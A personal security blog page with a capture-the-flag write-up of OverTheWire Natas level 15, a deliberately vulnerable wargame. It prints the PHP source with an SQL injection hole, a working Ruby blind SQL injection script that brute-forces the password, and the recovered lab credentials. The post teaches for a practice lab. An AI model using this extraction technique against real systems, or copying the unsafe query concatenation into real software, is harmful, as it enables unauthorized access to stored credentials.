<!DOCTYPE html>
<html lang="en-US">
	<head>
		<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
		<meta content='MattAndreko.com' name='description'/>
		<meta content='matt,andreko,mandreko,hostess,h0stess,hacking,exploitation,wargames' name='keywords'/>
		
		<meta content='@mandreko' name='twitter:site'/>
		<meta content='@mandreko' name='twitter:creator'/>
		
		<link href='https://www.mattandreko.com/favicon.ico' rel='icon' type='image/x-icon'/>
		<link href='https://www.mattandreko.com/' rel='canonical'/>
		<title>OverTheWire Natas Level 15</title>

		<link href="//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic" media="all" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/css/fontawesome.min.css" integrity="sha256-2YN65RPLgK7PP1NpH0YKIgYwPo7o/96HqVXBH7lQ3MU=" crossorigin="anonymous" />
		<link type="text/css" rel="stylesheet" href="/css/main.css" />

		<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous" defer async></script>
		<script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/fontawesome.min.js" integrity="sha256-p1rugc6vQ3W1M+J8xcHsQA07SkKvpGJlz4Uo+mxPP7Q=" crossorigin="anonymous" defer async></script>
		<script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/brands.min.js" integrity="sha256-oAJXCqY95Tu+gAhKEFrSyNb8MZw8QLH7M7DZnPvySmk=" crossorigin="anonymous" defer async></script>
		<script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/solid.min.js" integrity="sha256-VBkx1KuWMQsCMY3ShxVk5WyYNVcQYKNUpjF13YWP5ZE=" crossorigin="anonymous" defer async></script>
		
		<script async src="//www.googletagmanager.com/gtag/js?id=UA-25280110-1"></script>
		<script>
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-25280110-1');
		</script>
		

		
		<script>
			if (! $.fn.jquery) {
				document.write('<script src="/js/jquery.min.js"><\/script>');
			}
			if (! FontAwesome) {
				document.write('<script src="/js/fontawesome.min.js"><\/script>');
				document.write('<script src="/js/brands.min.js"><\/script>');
				document.write('<script src="/js/solid.min.js"><\/script>');
				document.write('<link rel="stylesheet" href="/css/fontawesome.min.css">');
			}
		</script>
	</head>
	<body class='index'>
	
	<div class='head-wrap'>
		<div class='row' id='header-wrappers'>
			<div class='headerleft'>
				<div class='headerleft section' id='headerleft'>
					<div class='widget Header' data-version='1' id='Header1'>
						<div id='header-inner'>
							<a href='/' style='display: block'><h1 style='display:none'></h1>
								<img alt="Logo" height="55px; " id="Header1_headerimg" src="/img/logo.svg" style="display: block" width="311px; ">
							</a>
						</div>
					</div>
				</div>
			</div>
			<div style='clear: both;'></div>
		</div>
	</div>
	<div class='navi-menu'>
		<div class='nav-menu section' id='Navigation Menu' name='Navigation Menu'>
			<div class='widget LinkList' data-version='1' id='LinkList100'>
				<div class='widget-content'>
					<ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'>
						
							<li itemprop='name'><a href='/' itemprop='url'>HOME</a></li>
						
							<li itemprop='name'><a href='/categories' itemprop='url'>CATEGORIES</a></li>
						
							<li itemprop='name'><a href='/resume.pdf' itemprop='url'>RESUME</a></li>
						
					</ul>
					<select class="selectnav" id="selectnav2">
						<option value="">Menu</option>
						
						<option value='/'>HOME</option>
						
						<option value='/categories'>CATEGORIES</option>
						
						<option value='/resume.pdf'>RESUME</option>
						
					</select>
				</div>
			</div>
		</div>
		<div class='top-bar-social blue section' id='header social widget' name='Top Social Widget'>
			<div class='widget LinkList' data-version='1' id='LinkList230'>
				<div class='widget-content'>
					<ul id='social'>
						
							<li><a class='facebook' href='https://www.facebook.com/mattandreko' title='facebook'><i class="fab fa-facebook"></i></a></li>
						
						
							<li><a class='twitter' href='https://www.twitter.com/mandreko' title='twitter'><i class="fab fa-twitter"></i></a></li>
						
						
							<li><a class='linkedin' href='https://www.linkedin.com/mattandreko' title='linkedin'><i class="fab fa-linkedin"></i></a></li>
						
						
							<li><a class='stack-overflow' href='http://stackoverflow.com/story/mattandreko' title='stack-overflow'><i class="fab fa-stack-overflow"></i></a></li>
						
						
							<li><a class='github' href='https://www.github.com/mandreko' title='github'><i class="fab fa-github"></i></a></li>
						
						
							<li><a class='instagram' href='https://www.instagram.com/mandreko' title='instagram'><i class="fab fa-instagram"></i></a></li>
						
					</ul>
				</div>
			</div>
		</div>
		<div style='clear: both;'></div>
	</div>
	
	<div style='clear: both;'></div>
	<div id="outer-wrapper" class="index home">


<div class='row' id='content-wrapper'>
    <div id='main-wrapper'>
      <div class='main section' id='main'>
      


        <div id="main">
          <div id="content">
            <div>
              <article class="hentry" role="article">

                
                

                <div class="entry-content">
                  
                  
                  <p>Up until now, none of the OverTheWire Natas challenges really gave me that much of an issue. This one however, took me a couple hours to complete. Level 15 is a fun blind sql-injection vulnerability.</p>

<!-- more -->

<p>It starts out with a username check dialog, which pretty much only gives you a binary value as to if a username exists or not.</p>

<figure class="img-responsive">
    <img src="/img/natas15_1.png"/> 
</figure>


<p>I looked at the source code, and couldn&rsquo;t see any way to inject some SQL to get it to retrieve the password for me.</p>

<pre><code>&lt;html&gt; 
&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt; 
&lt;body&gt; 
&lt;h1&gt;natas15&lt;/h1&gt; 
&lt;div id=&quot;content&quot;&gt; 
&lt;? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists(&quot;username&quot;, $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;'); 
    mysql_select_db('natas15', $link); 
     
    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;; 
    if(array_key_exists(&quot;debug&quot;, $_GET)) { 
        echo &quot;Executing query: $query&lt;br&gt;&quot;; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) &gt; 0) { 
        echo &quot;This user exists.&lt;br&gt;&quot;; 
    } else { 
        echo &quot;This user doesn't exist.&lt;br&gt;&quot;; 
    } 
    } else { 
        echo &quot;Error in query.&lt;br&gt;&quot;; 
    } 

    mysql_close($link); 
} else { 
?&gt; 

&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; 
Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; 
&lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt; 
&lt;/form&gt; 
&lt;? } ?&gt; 
&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; 
&lt;/div&gt; 
&lt;/body&gt; 
&lt;/html&gt; 
</code></pre>

<p>I did notice though, that it would verify that a row was returned, so I could inject SQL to brute-force the password. Assuming that the password was 32 digits long (like the previous ones), this could take some time however, since the character set was uppercase, lowercase, and digits. That&rsquo;s up to 62 attempts per digit of the password. I started doing this manually to verify that this was a possibility. With the &ldquo;debug&rdquo; flag on, you can see the query, and that the first digit of the password is not &ldquo;b&rdquo;.</p>

<figure class="img-responsive">
    <img src="/img/natas15_1.png"/> 
</figure>


<p>I cycled through manually all the lowercase and upper case letters. Once I got partially through the numbers, I got a successful hit! This means that the password starts with a &ldquo;3&rdquo;.</p>

<figure class="img-responsive">
    <img src="/img/natas15_1.png"/> 
</figure>


<p>The next step for me, was to automate this process. I decided to write some ruby to accomplish it. This code seems to do the job:</p>

<pre><code>require 'uri'
require 'net/http'

url = URI.parse(&quot;http://natas15.natas.labs.overthewire.org/index.php&quot;)
http = Net::HTTP.new(url.host, url.port)
chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = &quot;&quot;
found = false

# 64 was selected, since the password field is a varchar(64)
# Most likely, since all other passwords were 32 digits long, it'll be that
(1..64).each do |i|
 chars.each do |c| 
  found = false
  request = Net::HTTP::Post.new(url.request_uri)
  request.basic_auth(&quot;natas15&quot;, &quot;m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV&quot;)
  query = 'natas16&quot; AND SUBSTRING(password, ' + i.to_s + ', 1) LIKE BINARY &quot;' + c
  request.set_form_data({&quot;username&quot; =&gt; query})
  response = http.request(request)

  if response.body.include?(&quot;This user exists&quot;)
   password += c
   found = true
   puts &quot;Current pass: #{password}&quot;
   break
  end
 end
 # If no letter/number was found, it's fairly safe to assume it's done
 break if !found
end

</code></pre>

<p>The output shows:</p>

<pre><code>mandreko$ ruby natas15.rb
Current pass: 3
Current pass: 3V
Current pass: 3Vf
Current pass: 3VfC
Current pass: 3VfCz
Current pass: 3VfCzg
Current pass: 3VfCzga
Current pass: 3VfCzgaW
Current pass: 3VfCzgaWj
Current pass: 3VfCzgaWjE
Current pass: 3VfCzgaWjEA
Current pass: 3VfCzgaWjEAc
Current pass: 3VfCzgaWjEAcm
Current pass: 3VfCzgaWjEAcmC
Current pass: 3VfCzgaWjEAcmCQ
Current pass: 3VfCzgaWjEAcmCQp
Current pass: 3VfCzgaWjEAcmCQph
Current pass: 3VfCzgaWjEAcmCQphi
Current pass: 3VfCzgaWjEAcmCQphiE
Current pass: 3VfCzgaWjEAcmCQphiEP
Current pass: 3VfCzgaWjEAcmCQphiEPo
Current pass: 3VfCzgaWjEAcmCQphiEPoX
Current pass: 3VfCzgaWjEAcmCQphiEPoXi
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9H
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Ht
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htl
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htlm
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmV
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
</code></pre>

<p>And there you go, the password for level 16 shows up as the last line before it quits.</p>

                </div>
                
              </article>
            </div>
          </div>
        </div>


      
      </div>
    </div>
    
    <div id='sidebar-wrapper'>
      <div class='sidebar ready-widget section' id='sidebar'>
        <div class='widget HTML' data-version='1' id='HTML3'>
	<h2 class='title'>Author</h2>
	<div class='widget-content'>
		<div class="sidebar_about_author">
			<div class="inner_wrapper">
				<div class="aboutme-img">
					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
				</div>
			</div>
			<div class="aboutme-info">
				<h4>Matt Andreko</h4>
				<p>Security Consultant</p>
			</div>
		</div>
	</div>
	<div class='clear'></div>
</div>
        <div class='RecentPosts' data-version='1' id='RecentPosts1'>
	<h2>Recent Posts</h2>
	<div class='widget-content recent-posts'>
		<ul>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>
							<img alt='Compiling SSLScan with SSLv2 support on OSX' border='0' height='72' src='https://www.mattandreko.com/img/sslscan_apple.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>Compiling SSLScan with SSLv2 support on OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2014/08/01/burp-icon-in-osx/'>
							<img alt='Burp Icon in OSX' border='0' height='72' src='https://www.mattandreko.com/img/automator_burp.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2014/08/01/burp-icon-in-osx/'>Burp Icon in OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>
							<img alt='Backdoor Modules for Netgear, Linksys, and Other Routers' border='0' height='72' src='https://www.mattandreko.com/img/backdoor_all_the_routers.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>Backdoor Modules for Netgear, Linksys, and Other Routers</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2013/11/20/brainpan2/'>
							<img alt='Brainpan2' border='0' height='72' src='https://www.mattandreko.com/img/brainpan.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2013/11/20/brainpan2/'>Brainpan2</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2013/06/18/canon-y-u-no-security/'>
							<img alt='Canon, Y U NO Security?' border='0' height='72' src='https://www.mattandreko.com/img/y-u-no-guy.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2013/06/18/canon-y-u-no-security/'>Canon, Y U NO Security?</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
		</ul>
		<div class='clear'></div>
	</div>
</div>

        <div class='widget Label' data-version='1' id='Label1'>
	<h2>Top Categories</h2>
	<div class='widget-content cloud-label-widget-content'>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/hacking'>hacking</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/wargames'>wargames</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/linux'>linux</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/protostar'>protostar</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/natas'>natas</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/nebula'>nebula</a>
			</span>
		
		<div class='clear'></div>
	</div>
</div>
      </div>
    </div>
    <div style='clear: both;'></div>
  </div>





		</div>
		
		<div id='w2t_footer'>
			<div class='w2t-copy-container row'>
				<div class='w2t_footer_copyright'>
					Copyright &copy; 2019 Matt Andreko. All Rights Reserved
				</div>
			</div>
		</div>
		
		
			
				<script type="text/javascript">
	var disqus_shortname = 'mattandreko';
	var disqus_script = 'count.js';

	(function () {
		var dsq = document.createElement('script'); 
		dsq.type = 'text/javascript'; 
		dsq.async = true;
		dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	}());
</script>
			
		
	</body>
</html>

